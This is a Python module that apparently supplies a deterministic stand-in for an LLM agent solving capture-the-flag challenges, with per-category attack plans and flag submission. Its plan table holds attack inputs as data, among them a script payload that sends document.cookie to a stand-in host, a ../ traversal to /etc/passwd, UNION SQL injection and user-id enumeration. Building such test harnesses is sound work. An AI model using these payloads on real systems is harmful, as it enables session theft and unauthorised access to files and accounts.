"""Mock LLM decision policy (deterministic ReAct stand-in).

No real model is required. Given the ReAct context (challenge + step history),
this policy:

1. Inspects the most recent observation. If it contains a flag, it emits a
   ``submit`` action carrying that flag.
2. Otherwise it follows a short, category-specific plan of tool calls that walks
   toward the vulnerability (with a harmless recon/probe warm-up step first, to
   exercise real multi-step selection).

The interface (``decide(challenge, history) -> Action``) is intentionally the
same shape a real LLM-backed policy would expose, so it can be swapped later.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from .challenges import Challenge
from .flag_extractor import extract_flag


@dataclass
class Action:
    """A single decided action in the ReAct loop."""

    tool: str
    params: Dict[str, Any] = field(default_factory=dict)
    thought: str = ""
    flag: Optional[str] = None  # populated only for submit actions

    @property
    def is_submit(self) -> bool:
        return self.tool == "submit"


# Category -> ordered list of planned tool calls (before any submit).
_PLANS: Dict[str, List[Dict[str, Any]]] = {
    "web-sqli": [
        {
            "tool": "recon",
            "params": {"wordlist": "common"},
            "thought": "Map the exposed services before attacking the login form.",
        },
        {
            "tool": "exploit",
            "params": {"vuln": "sqli", "technique": "union", "param": "id"},
            "thought": "Login form looks injectable; try a UNION-based dump of the users table.",
        },
    ],
    "web-xss": [
        {
            "tool": "http_probe",
            "params": {"path": "/search", "q": "test"},
            "thought": "Probe the search page to see how the 'q' parameter is reflected.",
        },
        {
            "tool": "exploit",
            "params": {"vuln": "xss", "payload": "<script>fetch('//atk/'+document.cookie)</script>"},
            "thought": "Reflection is unescaped; inject a script payload to steal the cookie.",
        },
    ],
    "recon-info": [
        {
            "tool": "recon",
            "params": {"wordlist": "common", "deep": True},
            "thought": "Deep-enumerate directories to find exposed backup/config files.",
        },
    ],
    "file-lfi": [
        {
            "tool": "http_probe",
            "params": {"path": "/view?file=index.html"},
            "thought": "Check the viewer's normal behaviour with a benign file first.",
        },
        {
            "tool": "http_probe",
            "params": {"path": "/view?file=../../../../etc/passwd"},
            "thought": "No sanitisation seen; try classic path traversal to read /etc/passwd.",
        },
    ],
    "crypto-weak": [
        {
            "tool": "recon",
            "params": {},
            "thought": "Grab the service banner and the captured token from the oracle.",
        },
        {
            "tool": "exploit",
            "params": {"vuln": "crypto", "technique": "xor", "key": "brute"},
            "thought": "Key space is tiny; brute force the single-byte XOR key.",
        },
    ],
    "web-idor": [
        {
            "tool": "http_probe",
            "params": {"path": "/api/user/1"},
            "thought": "Inspect our own user object to learn the response shape.",
        },
        {
            "tool": "http_probe",
            "params": {"path": "/api/user/2"},
            "thought": "No authz check observed; increment the id to read another user.",
        },
    ],
}


class MockLLM:
    """Deterministic ReAct policy standing in for a real LLM."""

    def decide(self, challenge: Challenge, history: List[Any]) -> Action:
        # 1) If the last observation revealed a flag, submit it.
        if history:
            last_observation = getattr(history[-1], "observation", "")
            flag = extract_flag(last_observation)
            if flag:
                return Action(
                    tool="submit",
                    flag=flag,
                    thought=(
                        f"The last observation contains '{flag}', which matches a "
                        f"flag pattern. Submitting it to the platform."
                    ),
                )

        # 2) Otherwise follow the category plan by number of tool calls taken.
        plan = _PLANS.get(challenge.category, [])
        idx = len(history)
        if idx < len(plan):
            step = plan[idx]
            return Action(
                tool=step["tool"],
                params=dict(step["params"]),
                thought=step["thought"],
            )

        # 3) Plan exhausted without a flag.
        return Action(
            tool="give_up",
            thought="Exhausted my plan without recovering a flag for this challenge.",
        )
